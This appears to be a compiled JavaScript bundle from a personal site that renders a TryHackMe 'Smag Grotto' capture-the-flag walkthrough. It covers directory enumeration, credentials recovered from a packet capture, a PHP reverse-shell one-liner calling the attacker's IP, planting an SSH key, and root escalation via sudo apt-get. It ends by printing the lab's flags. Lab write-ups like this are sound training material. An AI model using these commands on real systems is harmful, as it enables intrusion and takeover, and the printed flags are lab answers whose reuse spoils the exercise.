"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1679],{3905:(e,t,r)=>{r.d(t,{Zo:()=>m,kt:()=>k});var n=r(67294);function a(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function o(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function s(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?o(Object(r),!0).forEach((function(t){a(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):o(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function l(e,t){if(null==e)return{};var r,n,a=function(e,t){if(null==e)return{};var r,n,a={},o=Object.keys(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||(a[r]=e[r]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var p=n.createContext({}),i=function(e){var t=n.useContext(p),r=t;return e&&(r="function"==typeof e?e(t):s(s({},t),e)),r},m=function(e){var t=i(e.components);return n.createElement(p.Provider,{value:t},e.children)},u="mdxType",c={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},d=n.forwardRef((function(e,t){var r=e.components,a=e.mdxType,o=e.originalType,p=e.parentName,m=l(e,["components","mdxType","originalType","parentName"]),u=i(r),d=a,k=u["".concat(p,".").concat(d)]||u[d]||c[d]||o;return r?n.createElement(k,s(s({ref:t},m),{},{components:r})):n.createElement(k,s({ref:t},m))}));function k(e,t){var r=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=r.length,s=new Array(o);s[0]=d;var l={};for(var p in t)hasOwnProperty.call(t,p)&&(l[p]=t[p]);l.originalType=e,l[u]="string"==typeof e?e:a,s[1]=l;for(var i=2;i<o;i++)s[i]=r[i];return n.createElement.apply(null,s)}return n.createElement.apply(null,r)}d.displayName="MDXCreateElement"},32869:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>p,contentTitle:()=>s,default:()=>c,frontMatter:()=>o,metadata:()=>l,toc:()=>i});var n=r(87462),a=(r(67294),r(3905));const o={},s="Smag Grotto",l={unversionedId:"Tryhackme/Smag Grotto/Smag Grotto",id:"Tryhackme/Smag Grotto/Smag Grotto",title:"Smag Grotto",description:"Do you remember how to analyse packets?",source:"@site/writeups/Tryhackme/Smag Grotto/Smag Grotto.md",sourceDirName:"Tryhackme/Smag Grotto",slug:"/Tryhackme/Smag Grotto/",permalink:"/writeups/Tryhackme/Smag Grotto/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Skynet",permalink:"/writeups/Tryhackme/Skynet/"},next:{title:"Source",permalink:"/writeups/Tryhackme/Source/"}},p={},i=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Smag Grotto",id:"task-1-smag-grotto",level:2}],m={toc:i},u="wrapper";function c(e){let{components:t,...o}=e;return(0,a.kt)(u,(0,n.Z)({},m,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"smag-grotto"},"Smag Grotto"),(0,a.kt)("p",null,"Do you remember how to analyse packets?"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/smaggrotto"},"Smag Grotto")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enueration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Network Forensics"),(0,a.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,a.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-smag-grotto"},"Task 1 Smag Grotto"),(0,a.kt)("p",null,"Deploy the machine and get root privileges."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Smag Grotto$ gobuster dir -u 10.10.8.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.8.31\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/14 12:21:37 Starting gobuster\n===============================================================\n/mail (Status: 301)\nProgress: 5966 / 220561 (2.70%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/14 12:22:05 Finished\n===============================================================\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.8.31/mail/"},"http://10.10.8.31/mail/")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.8.31/aW1wb3J0YW50/dHJhY2Uy.pcap"},"http://10.10.8.31/aW1wb3J0YW50/dHJhY2Uy.pcap")),(0,a.kt)("p",null,(0,a.kt)("img",{src:r(32374).Z,width:"1290",height:"463"})),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'Frame 4: 268 bytes on wire (2144 bits), 268 bytes captured (2144 bits)\nEthernet II, Src: PcsCompu_57:81:43 (08:00:27:57:81:43), Dst: PcsCompu_dd:5e:de (08:00:27:dd:5e:de)\nInternet Protocol Version 4, Src: 192.168.33.10, Dst: 192.168.33.69\nTransmission Control Protocol, Src Port: 34030, Dst Port: 80, Seq: 1, Ack: 1, Len: 202\nHypertext Transfer Protocol\n    POST /login.php HTTP/1.1\\r\\n\n    Host: development.smag.thm\\r\\n\n    User-Agent: curl/7.47.0\\r\\n\n    Accept: */*\\r\\n\n    Content-Length: 39\\r\\n\n    Content-Type: application/x-www-form-urlencoded\\r\\n\n    \\r\\n\n    [Full request URI: http://development.smag.thm/login.php]\n    [HTTP request 1/1]\n    [Response in frame: 6]\n    File Data: 39 bytes\n\nHTML Form URL Encoded: application/x-www-form-urlencoded\n    Form item: "username" = "helpdesk"\n    Form item: "password" = "cH4nG3M3_n0w"\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"development.smag.thm")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"helpdesk:cH4nG3M3_n0w")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://development.smag.thm/"},"http://development.smag.thm/")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://development.smag.thm/admin.php"},"http://development.smag.thm/admin.php")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-php"},'php -r \'$sock=fsockopen("10.8.106.222",9001);exec("/bin/bash -i <&3 >&3 2>&3");\'\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > /opt/.backups/jake_id_rsa.pub.backup\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Smag Grotto$ ssh jake@10.10.8.31\nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nLast login: Fri Jun  5 10:15:15 2020\njake@smag:~$ ls\nuser.txt\njake@smag:~$ cat user.txt\niusGorV7EbmxM5AuIe2w499msaSuqU3j\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"jake@smag:~$ sudo -l\nMatching Defaults entries for jake on smag:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser jake may run the following commands on smag:\n    (ALL : ALL) NOPASSWD: /usr/bin/apt-get\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/apt-get/#sudo"},"https://gtfobins.github.io/gtfobins/apt-get/#sudo")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash\nroot@smag:/tmp# cd /root\nroot@smag:/root# ls\nroot.txt\nroot@smag:/root# cat root.txt\nuJr6zRgetaniyHVRqqL58uRasybBKz2T\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"iusGorV7EbmxM5AuIe2w499msaSuqU3j")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"uJr6zRgetaniyHVRqqL58uRasybBKz2T")))}c.isMDXComponent=!0},32374:(e,t,r)=>{r.d(t,{Z:()=>n});const n=r.p+"assets/images/2020-10-14_12-25-95901ed7d02d9e0245cfe2215b8d2632.png"}}]);